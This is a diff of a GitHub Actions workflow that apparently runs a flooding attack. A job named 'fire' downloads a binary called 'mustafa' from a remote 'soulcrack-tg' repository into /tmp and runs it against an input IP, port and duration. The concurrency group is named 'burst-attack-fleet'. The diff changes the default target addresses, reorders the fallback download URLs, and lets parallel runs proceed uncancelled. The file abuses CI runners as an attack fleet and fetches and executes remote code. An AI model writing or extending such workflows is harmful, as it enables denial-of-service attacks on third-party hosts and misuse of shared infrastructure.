@@ -18,12 +18,12 @@ on:
         default: '60'
       bin:
         description: 'Binary Name'
-        required: false
+        required: true
         default: 'mustafa'
 
 concurrency:
-  group: burst-attack-fleet
-  cancel-in-progress: true
+  group: burst-${{ github.run_id }}
+  cancel-in-progress: false
 
 jobs:
   fire:
@@ -36,16 +36,16 @@ jobs:
     steps:
       - name: Execute
         run: |
-          IP="${{ github.event.inputs.ip || '91.108.17.4' }}"
-          PORT="${{ github.event.inputs.port || '32001' }}"
+          IP="${{ github.event.inputs.ip || '1.1.1.1' }}"
+          PORT="${{ github.event.inputs.port || '80' }}"
           DUR="${{ github.event.inputs.duration || '60' }}"
           BIN="${{ github.event.inputs.bin || 'mustafa' }}"
           B=""
           if curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/HEAD/$BIN" 2>/dev/null; then
             B="/tmp/bin"
-          elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin2 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/main/$BIN" 2>/dev/null; then
+          elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin2 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/master/$BIN" 2>/dev/null; then
             B="/tmp/bin2"
-          elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin3 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/master/$BIN" 2>/dev/null; then
+          elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin3 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/main/$BIN" 2>/dev/null; then
             B="/tmp/bin3"
           fi
           if [ -n "$B" ]; then
